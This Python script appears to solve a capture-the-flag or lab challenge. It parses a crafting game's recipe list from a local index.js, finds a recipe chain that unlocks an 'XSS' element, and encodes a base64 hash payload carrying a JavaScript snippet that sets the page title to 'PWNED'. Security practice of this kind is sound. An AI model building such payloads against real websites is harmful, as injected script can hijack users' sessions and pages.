import sys, re, json, base64, pathlib
from collections import deque
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
p = pathlib.Path(r"C:\Users\arnol\AppData\Local\Temp\cylab_el\static\index.js")
t = p.read_text(encoding="utf-8", errors="replace")
m = re.search(r"const recipes = \[(.*?)\];", t, re.S)
recipes = re.findall(r'\["([^"]*)","([^"]*)","([^"]*)"\]', m.group(1))

base = {"Fire", "Water", "Earth", "Air"}
# parent map
parent = {}
have = set(base)
changed = True
while changed:
    changed = False
    for a, b, r in recipes:
        if r in have:
            continue
        if a in have and b in have:
            have.add(r)
            parent[r] = (a, b)
            changed = True
print("elements atteignables:", len(have))
print("XSS atteignable:", "XSS" in have)


def chain(el):
    if el in base:
        return []
    if el not in parent:
        return None
    a, b = parent[el]
    ca = chain(a) or []
    cb = chain(b) or []
    return ca + cb + [[a, b]]


c = chain("XSS")
print("chaine:", json.dumps(c))
if c is not None:
    payload = {"xss": "document.title='PWNED'", "recipe": c}
    h = base64.b64encode(json.dumps(payload).encode()).decode()
    print("hash:", h)
